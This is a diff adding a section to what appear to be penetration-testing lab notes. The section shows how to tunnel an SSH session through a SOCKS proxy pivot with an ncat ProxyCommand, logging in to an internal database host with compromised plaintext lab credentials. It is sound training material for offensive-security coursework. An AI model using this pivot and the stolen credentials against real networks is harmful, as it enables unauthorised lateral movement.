@@ -204,3 +204,29 @@ channel 1: chan_write_failed for ostate 3
 ```
 
 This is just the network traffic of failed scan traffic. Note the port found to be open, `9062`, generated no error message.
+
+#### SSH Session
+
+If an attacker wants to run an SSH session through the SOCKS proxy pivot, they can use the SSH ProxyCommand setting and Ncat as shown in [this example](../tunneling-through-dpi/http-tunneling/chisel.md#proxycommand). The linked example is using a Chisel proxy and thus settings must be modified slightly. To use the tunnel created above (endpoint at `127.0.0.1:9998`) for SSH access to `PGDATABASE01` (at `10.4.190.215:22`) the command would be:
+
+{% code overflow="wrap" %}
+```bash
+sh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:9998 %h %p' database_admin@10.4.190.215
+```
+{% endcode %}
+
+* For this example, the credentials compromised [here](../simple-port-forwarding-scenario.md#cracking-the-hash) can be used (`database_admin:sqlpass123`)
+
+This would result in a valid SSH session proxied through `CONFLUENCE01`:
+
+```bash
+kali@kali:~$ ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:9998 %h %p' database_admin@10.4.190.215
+The authenticity of host '10.4.190.215 (<no hostip for proxy command>)' can't be established.
+...
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+...
+database_admin@10.4.249.215's password: 
+Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-125-generic x86_64)
+...
+database_admin@pgdatabase01:~$ 
+```
